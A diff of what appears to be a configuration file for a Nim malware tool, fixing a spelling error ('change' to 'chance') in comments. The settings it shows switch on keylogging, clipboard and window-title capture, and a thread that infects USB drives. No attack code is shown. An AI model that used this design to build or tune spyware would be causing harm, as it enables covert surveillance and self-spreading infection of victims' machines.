@@ -21,8 +21,8 @@ const USE_PERSISTENCE_THREAD*: bool = false
 const USE_CLIPBOARD_THREAD*: bool = true
 
 ## run clipboardThread every n ms
-## higher value: lower cpu usage, higher change of not reflecting all data changes
-## lower value: higher cpu usage, lower change of not reflecting all data changes
+## higher value: lower cpu usage, higher chance of not reflecting all data changes
+## lower value: higher cpu usage, lower chance of not reflecting all data changes
 ## DEFAULT: 100
 const CLIPBOARD_THREAD_CHECK_INTERVAL*: int = 100
 
@@ -47,8 +47,8 @@ const USE_CONNECTED_WIFI_THREAD*: bool = false
 const USE_WINDOW_NAME_THREAD*: bool = true
 
 ## run windowNameThread every n ms
-## higher value: lower cpu usage, higher change of not reflecting all data changes
-## lower value: higher cpu usage, lower change of not reflecting all data changes
+## higher value: lower cpu usage, higher chance of not reflecting all data changes
+## lower value: higher cpu usage, lower chance of not reflecting all data changes
 ## DEFAULT: 10
 const WINDOW_NAME_THREAD_CHECK_INTERVAL * : int = 10
 
@@ -72,8 +72,8 @@ const USE_KEYLOGGER_THREAD*: bool = true
 const USE_KEYBOARD_LOCALE_THREAD*: bool = USE_KEYLOGGER_THREAD
 
 ## run keyboardLocaleThread every n ms
-## higher value: lower cpu usage, higher change of not reflecting all data changes
-## lower value: higher cpu usage, lower change of not reflecting all data changes
+## higher value: lower cpu usage, higher chance of not reflecting all data changes
+## lower value: higher cpu usage, lower chance of not reflecting all data changes
 ## DEFAULT: 5000
 const KEYBOARD_LOCALE_THREAD_CHECK_INTERVAL * : int = 5000
 
@@ -94,8 +94,8 @@ const UNSAFE_REMOVE_FILE*: bool = false
 const USE_INFECT_THREAD*: bool = false
 
 ## run infectThread every n ms
-## higher value: lower cpu usage, higher change of not infecting all usbs
-## lower value: higher cpu usage, lower change of not infecting all usbs
+## higher value: lower cpu usage, higher chance of not infecting all usbs
+## lower value: higher cpu usage, lower chance of not infecting all usbs
 ## DEFAULT: 10000
 const INFECT_THREAD_CHECK_INTERVAL*: int = 10000
 
